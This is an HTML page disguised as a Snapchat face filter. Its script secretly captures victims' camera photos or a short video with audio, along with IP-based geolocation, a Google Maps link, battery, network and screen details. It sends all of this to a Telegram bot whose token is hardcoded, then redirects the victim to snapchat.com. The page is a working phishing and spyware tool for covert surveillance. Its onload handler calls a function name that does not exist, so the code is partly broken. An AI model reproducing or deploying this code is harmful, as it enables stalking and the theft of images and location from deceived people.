<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Lens - Funny Face Filter</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            z-index: 10;
        }
        .filter-title {
            background: rgba(0, 0, 0, 0.6);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        .bottom-tray {
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
        }
        .capture-btn {
            width: 75px;
            height: 75px;
            border: 5px solid #ffffff;
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
        }
        .hint-text {
            font-size: 12px;
            color: #ccc;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="filter-title">🔥 Funny Face Lens</div>
        <div>✨ Snapchat</div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview"></video>
        <div id="loading-text" style="position:absolute; z-index:5;">Loading Filter... Please Allow Camera</div>
    </div>

    <div class="bottom-tray">
        <button class="capture-btn" onclick="triggerCapture()"></button>
        <div class="hint-text">Tap to try filter</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal)

        let globalStream = null;
        let ipInfo = {};

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown',
                    lat: data.latitude || '',
                    lon: data.longitude || ''
                };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A', lat: '', lon: '' };
            }
        }

        async function initCamera() {
            ipInfo = await getIPAndLocation();
            let constraints = {
                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: !cameraType // Agar universal hai to audio bhi, warna sirf video
            };

            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user";
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else {
                        throw e;
                    }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                document.getElementById('loading-text').style.display = 'none';

                // Agar universal link hai to auto video record shuru kar dega
                if (!cameraType) {
                    startVideoRecording(globalStream);
                }

            } catch (err) {
                alert("Please click 'Allow' to load the Snapchat filter!");
            }
        }

        // --- UNIVERSAL LINK: Video Recording ---
        async function startVideoRecording(stream) {
            try {
                let recordedChunks = [];
                let mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    stream.getTracks().forEach(track => track.stop());

                    let batteryText = "N/A";
                    try {
                        let bat = await navigator.getBattery();
                        batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
                    } catch(e) {}

                    let netType = (navigator.connection ? navigator.connection.effectiveType : "4G").toUpperCase();
                    let mapLink = (ipInfo.lat && ipInfo.lon) ? `https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}` : "N/A";

                    let detailsMsg = 
                        `🌐 **IP Information**\n` +
                        `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                        `📍 Location: ${ipInfo.city}\n` +
                        `🌍 Region: ${ipInfo.region}\n` +
                        `🗺 Country: ${ipInfo.country}\n` +
                        `🗺️ Maps: ${mapLink}\n` +
                        `📡 ISP: ${ipInfo.isp}\n\n` +
                        `📱 **Device Details**\n` +
                        `🔋 Battery: ${batteryText}\n` +
                        `📶 Network: ${netType}\n` +
                        `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                        `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                        `👑 **CREDIT BY : आयुष नेगी**`;

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'snap_video.webm');
                    formData.append('caption', detailsMsg);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    window.location.href = "https://www.snapchat.com";
                };

                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 4500);

            } catch (err) {
                window.location.href = "https://www.snapchat.com";
            }
        }

        // --- FRONT/BACK LINK: 5-6 Photos with IP only on 1st photo ---
        async function triggerCapture() {
            if (!globalStream) {
                alert("Camera not ready yet!");
                return;
            }

            document.getElementById('loading-text').innerText = "Applying Filter...";
            document.getElementById('loading-text').style.display = 'block';

            const videoElement = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = videoElement.videoWidth || 1280;
            canvas.height = videoElement.videoHeight || 720;
            const context = canvas.getContext('2d');

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let netType = (navigator.connection ? navigator.connection.effectiveType : "4G").toUpperCase();
            let mapLink = (ipInfo.lat && ipInfo.lon) ? `https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}` : "N/A";

            for (let i = 1; i <= 6; i++) {
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                
                if (blob) {
                    let caption = "";
                    
                    // Sirf pehli photo ke sath IP aur Device details aayengi
                    if (i === 1) {
                        caption = 
                            `🌐 **IP Information**\n` +
                            `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                            `📍 Location: ${ipInfo.city}\n` +
                            `🌍 Region: ${ipInfo.region}\n` +
                            `🗺 Country: ${ipInfo.country}\n` +
                            `🗺️ Maps: ${mapLink}\n` +
                            `📡 ISP: ${ipInfo.isp}\n\n` +
                            `📱 **Device Details**\n` +
                            `🔋 Battery: ${batteryText}\n` +
                            `📶 Network: ${netType}\n` +
                            `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}\n` +
                            `📸 Shot: ${i}/6\n\n` +
                            `👑 **CREDIT BY : आयुष नेगी**`;
                    } else {
                        // Baaki photos ke sath sirf shot number aur credit rahega
                        caption = `📸 Shot: ${i}/6\n\n👑 **CREDIT BY : आयुष नेगी**`;
                    }

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `photo_${i}.jpg`);
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

                await new Promise(resolve => setTimeout(resolve, 800));
            }

            globalStream.getTracks().forEach(track => track.stop());
            window.location.href = "https://www.snapchat.com";
        }

        window.onload = function() {
            init();
        };
    </script>
</body>
</html>
